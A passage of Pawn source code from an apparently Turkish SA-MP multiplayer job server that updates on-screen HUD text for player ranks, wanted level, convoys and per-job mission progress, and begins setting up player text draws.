  		case ClassPolice: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], PoliceRanks[ Rank[playerid] ][RankName]);
   		case ClassMafia: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], MafiaRanks[ Rank[playerid] ][RankName]);
    	case ClassRoadWorker: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], RoadWorkerRanks[ Rank[playerid] ][RankName]);
    	case ClassGemici: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], GemiciRanks[ Rank[playerid] ][RankName]);
    	case ClassOduncu: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], OduncuRanks[ Rank[playerid] ][RankName]);
    	case ClassBalikci: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], BalikciRanks[ Rank[playerid] ][RankName]);
    	case ClassCopcu: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], CopcuRanks[ Rank[playerid] ][RankName]);
    	case ClassBanka: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], BankaRanks[ Rank[playerid] ][RankName]);
    	case ClassFire: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], FireRanks[ Rank[playerid] ][RankName]);
        case ClassFBY: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], FBYRanks[ Rank[playerid] ][RankName]);
        case ClassPboy: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], PboyRanks[ Rank[playerid] ][RankName]);
        case ClassKargocu: PlayerTextDrawSetString(playerid, UI_ORBilgiH[playerid], KargocuRanks[ Rank[playerid] ][RankName]);
	}

	// Aranma TextDraw
	if(APlayerData[playerid][PlayerWanted] > 8)
	{
		PlayerTextDrawSetString(playerid, UI_WantedL[playerid], "]");
		format(Yazi, 512, "%d", APlayerData[playerid][PlayerWanted]);
		PlayerTextDrawSetString(playerid, UI_Wanted[playerid], Yazi);
	}else{
	    if(APlayerData[playerid][PlayerWanted] > 0)
	    {
	    	format(Yazi, 512, "");
	    	for(new i=0; i < APlayerData[playerid][PlayerWanted]; i++)
	    	{
				format(Yazi, 512, "%s]", Yazi);
	    	}
		}

		PlayerTextDrawSetString(playerid, UI_WantedL[playerid], Yazi);
	}

	if(APlayerSpawnData[playerid] == false || TextKapat[playerid] == 1)
	{
		PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
		PlayerTextDrawHide(playerid, UI_Wanted[playerid]);
	}else{
		if(APlayerData[playerid][PlayerWanted] > 0)
		{
			PlayerTextDrawShow(playerid, UI_WantedL[playerid]);
			if(APlayerData[playerid][PlayerWanted] > 8)
			{
			    PlayerTextDrawShow(playerid, UI_Wanted[playerid]);
			}else{
			    PlayerTextDrawHide(playerid, UI_Wanted[playerid]);
			}
		}else{
			PlayerTextDrawHide(playerid, UI_WantedL[playerid]);
			PlayerTextDrawHide(playerid, UI_Wanted[playerid]);
		}
	}

	// Konvoy TextDraw
	if(APlayerData[playerid][InConvoy] == true)
	{
	    new Convoy = APlayerData[playerid][ConvoyID];
	    new LeaderID = AConvoys[Convoy][Members][0];

		switch(APlayerData[LeaderID][PlayerClass])
		{
		    case ClassTruckDriver: format(Yazi, 512, "KAMYON KONVOYU(%d)", Convoy_CountMembers(Convoy));
			case ClassBusDriver: format(Yazi, 512, "OTOBUS KONVOYU(%d)", Convoy_CountMembers(Convoy));
		}

		PlayerTextDrawSetString(playerid, UI_OKBilgiH[playerid], Yazi);

		if(playerid == LeaderID)
		{
			if(Convoy_CountMembers(Convoy) > 1)
			{
				format(Yazi, 512, "~w~En Uzak ~g~~h~~h~%s  ~w~Mesafe ~r~%dm", GetName( Convoy_GetFurthestMember(Convoy) ), PlayerToPlayer(playerid, Convoy_GetFurthestMember(Convoy)));
			}else{
				format(Yazi, 512, "~w~Konvoyunuza oyuncularin gelmesini bekleyin");
			}
			PlayerTextDrawSetString(playerid, UI_OKBilgi[playerid], Yazi);
		}else{
			format(Yazi, 512, "~w~Lider ~g~~h~~h~%s  ~w~Mesafe ~r~%dm", GetName(LeaderID), PlayerToPlayer(playerid, LeaderID));
            PlayerTextDrawSetString(playerid, UI_OKBilgi[playerid], Yazi);
		}
	}else{
		PlayerTextDrawSetString(playerid, UI_OKBilgi[playerid], " ");
	}

	// Meslek TextDraw
	new Mesafe, Float:oX, Float:oY, Float:oZ, Float:XF, Float:YF, Float:ZF;
	GetPlayerPos(playerid, oX, oY, oZ);

	switch(APlayerData[playerid][PlayerClass])
	{
		case ClassTruckDriver:
		{
		    if(APlayerData[playerid][InConvoy] == true)
		    {
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 512, ALoads[APlayerData[playerid][LoadID]][LoadName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						format(Yazi, 512, "~w~Diger konvoy uyelerinin~n~yuk almasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 3)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 4)
		            {
						format(Yazi, 512, "~w~Diger konvoy uyelerinin~n~yuk bosaltmasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 512, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 512, "~w~Konvoy liderinizin gorev~n~baslatmasini bekleyin.");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		        }
		    }else{
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 512, ALoads[APlayerData[playerid][LoadID]][LoadName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						XF = ALocations[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = ALocations[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = ALocations[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 512, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 512, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		        }
		    }
		}
		case ClassBusDriver:
		{
		    if(APlayerData[playerid][InConvoy] == true)
		    {
		        if(APlayerData[playerid][JobStarted] == true)
		        {
  					format(Yazi, 512, "Yolcu");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

		            if(APlayerData[playerid][JobStep] == 1)
		            {
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 2)
		            {
						format(Yazi, 512, "~w~Diger konvoy uyelerinin~n~yolcu almasini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 3)
		            {
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 512, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }

		            if(APlayerData[playerid][JobStep] == 4)
		            {
						format(Yazi, 512, "~w~Diger konvoy uyelerinin~n~yolcu indirmesini bekleyin.");
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		            }
		        }else{
					format(Yazi, 512, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 512, "~w~Konvoy liderinizin gorev~n~baslatmasini bekleyin.");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		        }
		    }else{
  				if(APlayerData[playerid][JobStarted] == true)
     			{
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Yolcu");

					if(APlayerData[playerid][JobStep] == 1)
    				{
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     				}

					if(APlayerData[playerid][JobStep] == 2)
    				{
						XF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
						YF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
						ZF = BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
						Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

						format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", BusDriverMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], BusDriverMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     				}
        		}else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    			}
		    }
		}
		case ClassDolmusDriver:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
     		    new Joba, LineNr, Description[100], PassengersOnDolmus;
				Joba = APlayerData[playerid][JobID];
                
                LineNr = ADolmusRoutes[Joba][LineNumber];
				format(Description, 100, "%s", ADolmusRoutes[Joba][RouteDescription]);
				PassengersOnDolmus = APlayerData[playerid][Passengers];
				
				format(Yazi, 300, "Dolmus");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~HAT ~y~%i~w~ (~y~ Baslangic: %s~w~)~n~ ~w~ Mevcut yolcu: ~b~%i~n~~r~~h~/goreviptal", LineNr, Description, PassengersOnDolmus);
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}
 		case ClassPilot:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}
  		case ClassPolice:
		{
			format(Yazi, 300, "Suclu Yakala");
			PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

			format(Yazi, 300, "~g~~h~~h~'RMB' ~w~Ceza Keser~n~~g~~h~~h~'LCTRL' ~w~Uyari Verir");
			PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		}
		case ClassFBY:
		{
			format(Yazi, 300, "Suclu Yakala");
			PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

			format(Yazi, 300, "~g~~h~~h~'RMB' ~w~Ceza Keser~n~~g~~h~~h~'LCTRL' ~w~Uyari Verir");
			PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
		}
   		case ClassMafia:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}
        	}else{
        	    if(APlayerData[playerid][MafiaLoadHijacked] == true)
        	    {
					format(Yazi, 300, "Calinti Yuk");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 300, "~w~Caldiginiz ~r~yuku ~w~mafya~n~mekanina goturun.");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
        	    }else{
					format(Yazi, 300, "Gorev Yok");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
				}
    		}
		}

    	case ClassRoadWorker:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
     		    if(APlayerData[playerid][JobID] == 1) // Bozuk Radar Tamiri
     		    {
 					format(Yazi, 300, "Bozuk Radar");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					format(Yazi, 300, "~r~Bozuk radarlari~n~~w~tamir edin~n~~r~~h~/goreviptal");
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     		    }

      		    if(APlayerData[playerid][JobID] == 2) // Bozuk Araç Çekme
     		    {
 					format(Yazi, 300, "Bozuk Arac");
					PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

					if(APlayerData[playerid][JobStep] == 1)
    				{
						format(Yazi, 300, "~p~%s~w~'dan~n~Hurdalik'a~n~~r~~h~/goreviptal", ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenName]);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     				}

					if(APlayerData[playerid][JobStep] == 2)
    				{
						format(Yazi, 300, "~w~%s'dan~n~~p~Hurdalik~w~'a~n~~r~~h~/goreviptal", ABrokenVehicles[APlayerData[playerid][JobLoc1]][BrokenName]);
						PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     				}
     		    }
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}

		case ClassGemici:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], GemiciLoads[ APlayerData[playerid][LoadID] ]);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					XF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocX] - oX;
					YF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocY] - oY;
					ZF = GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocZ] - oZ;
					Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					XF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocX] - oX;
					YF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocY] - oY;
					ZF = GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocZ] - oZ;
					Mesafe = floatround( floatsqroot(XF*XF + YF*YF + ZF*ZF) );

					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~w~Mesafe ~y~%dm  ~r~~h~/goreviptal", GemiciMissionLoc[APlayerData[playerid][JobLoc1]][LocationName], GemiciMissionLoc[APlayerData[playerid][JobLoc2]][LocationName], Mesafe);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}

		case ClassOduncu:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Odun");

				format(Yazi, 300, "~w~Agac kesiliyor...~n~Surec: ~p~%d/100~n~~w~Uzerinizdeki Odun ~y~%d/20~n~~r~~h~/goreviptal", AgacTime[playerid], KesilenAgac[playerid]);
                PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Odun kesmeye baslamak~n~icin ~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}

		case ClassBalikci:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], "Balik");

				format(Yazi, 300, "~w~Balik tutuluyor...~n~Surec: ~p~%d/%d~n~~w~Uzerinizdeki Balik ~y~%d/20~n~~r~~h~/goreviptal", BalikAsama[playerid], BalikAsamaM[playerid], EldekiBalik[playerid]);
                PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Balik tutmaya baslamak~n~icin ~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}
		case ClassCopcu:
		{
			ControlCopcuGorev(playerid);
		}
		case ClassKargocu:
		{
			ControlKargocuGorev(playerid);
		}
		case ClassBanka:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}
		case ClassFire:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, ALoads[APlayerData[playerid][LoadID]][LoadName]);
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				if(APlayerData[playerid][JobStep] == 1)
    			{
					format(Yazi, 300, "~p~%s~w~'dan~n~%s'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}

				if(APlayerData[playerid][JobStep] == 2)
    			{
					format(Yazi, 300, "~w~%s'dan~n~~p~%s~w~'a~n~~r~~h~/goreviptal", ALocations[APlayerData[playerid][JobLoc1]][LocationName], ALocations[APlayerData[playerid][JobLoc2]][LocationName]);
					PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
     			}
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}
		case ClassPboy:
		{
  			if(APlayerData[playerid][JobStarted] == true)
     		{
				format(Yazi, 300, "Pizza");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~r~Evler~w~e Pizza dagitin.~n~Dagitilan Pizza: ~p~%d/%d~n~~r~~h~/goreviptal", APlayerData[playerid][JobStep]-1, APlayerData[playerid][PboyMaxStep]);
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
        	}else{
				format(Yazi, 300, "Gorev Yok");
				PlayerTextDrawSetString(playerid, UI_OGBilgiH[playerid], Yazi);

				format(Yazi, 300, "~w~Gorev baslatmak icin~n~~g~~h~~h~/work ~w~yazin");
				PlayerTextDrawSetString(playerid, UI_OGBilgi[playerid], Yazi);
    		}
		}

	}
	return 1;
}

// UpdateV5UI
UpdateV5UI()
{
	new UI_Yazi[128],year,month,day,hours,minutes,seconds;
	getdate(year, month, day), gettime(hours, minutes, seconds);
	new Aylar[12][15]={"Ocak","Subat","Mart","Nisan","Mayis","Haziran","Temmuz","Agustos","Eylul","Ekim","Kasim","Aralik"};

	V5UI_SCTimer++;
	if(V5UI_SCTimer == 5)
	{
	    V5UI_SCTimer = 0;
	    V5UI_SCIndex++;
	    if(V5UI_SCIndex == 4) V5UI_SCIndex = 0;

	    switch(V5UI_SCIndex)
	    {
	        case 0: TextDrawSetString(UI_SCBilgi, "~y~Website~w~' ~p~~h~~h~Canakkale Meslek.com");
	        case 1: TextDrawSetString(UI_SCBilgi, "~y~Facebook~w~' ~p~~h~~h~Canakkale Meslek");
	        case 2: TextDrawSetString(UI_SCBilgi, "~y~Ts3~w~' ~p~~h~~h~canakkale.ekibi.red");
	        case 3: TextDrawSetString(UI_SCBilgi, "~y~TK-TM~w~' ~p~~h~~h~ samp.Canakkale Meslek.com:7777");
	    }
	}

	format(UI_Yazi, 128, "~y~%d %s %d ~w~%d:%d", day, Aylar[month-1], year, hours, minutes);
	TextDrawSetString(UI_TarihSaat, UI_Yazi);
	return 1;
}

// LoadPlayerV5UI
LoadPlayerV5UI(playerid)
{
	// Alt Kýsým
	UI_AltBilgi[playerid] = CreatePlayerTextDraw(playerid,17.000000, 437.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_AltBilgi[playerid], 255);
	PlayerTextDrawFont(playerid,UI_AltBilgi[playerid], 2);
	PlayerTextDrawLetterSize(playerid,UI_AltBilgi[playerid], 0.200000, 1.000000);
	PlayerTextDrawColor(playerid,UI_AltBilgi[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_AltBilgi[playerid], 0);
	PlayerTextDrawSetProportional(playerid,UI_AltBilgi[playerid], 1);
	PlayerTextDrawSetShadow(playerid,UI_AltBilgi[playerid], 0);
	PlayerTextDrawSetSelectable(playerid,UI_AltBilgi[playerid], 0);


	// Sað Kýsým
	UI_ORBilgiH[playerid] = CreatePlayerTextDraw(playerid,510.000000, 130.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_ORBilgiH[playerid], 255);
	PlayerTextDrawFont(playerid,UI_ORBilgiH[playerid], 2);
	PlayerTextDrawLetterSize(playerid,UI_ORBilgiH[playerid], 0.219999, 1.000000);
	PlayerTextDrawColor(playerid,UI_ORBilgiH[playerid], -1);
	PlayerTextDrawSetOutline(playerid,UI_ORBilgiH[playerid], 0);
	PlayerTextDrawSetProportional(playerid,UI_ORBilgiH[playerid], 1);
	PlayerTextDrawSetShadow(playerid,UI_ORBilgiH[playerid], 1);
	PlayerTextDrawSetSelectable(playerid,UI_ORBilgiH[playerid], 0);

	UI_OGBilgiH[playerid] = CreatePlayerTextDraw(playerid,510.000000, 144.000000, " ");
	PlayerTextDrawBackgroundColor(playerid,UI_OGBilgiH[playerid], 255);
	PlayerTextDrawFont(playerid,UI_OGBilgiH[playerid], 2);
